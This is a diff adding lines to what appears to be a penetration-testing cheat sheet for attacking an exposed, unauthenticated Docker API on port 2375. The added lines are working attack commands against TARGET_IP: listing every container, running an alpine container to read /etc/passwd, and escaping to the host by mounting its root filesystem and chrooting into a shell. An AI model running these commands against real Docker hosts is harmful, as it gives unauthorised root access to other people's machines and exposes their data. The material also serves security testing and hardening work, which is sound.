@@ -40,3 +40,16 @@ If the server returns a JSON object containing the Docker version, Go version, a
 
     docker -H tcp://TARGET_IP:2375 images
 
+### 2) List all containers (inclusing stopped ones)
+
+    docker -H tcp://TARGET_IP:2375 ps -a
+
+## Remote Code Execution (RCE)
+
+### 1) Pull a lightweight image like alpine, then execute commands inside it
+
+    docker -H tcp://TARGET_IP:2375 run alpine cat /etc/passwd
+
+### 2) Escape to the host via Volume Mounting
+
+    docker -H tcp://TARGET_IP:2375 run -it -v /:/mnt/host alpine chroot /mnt/host /bin/sh
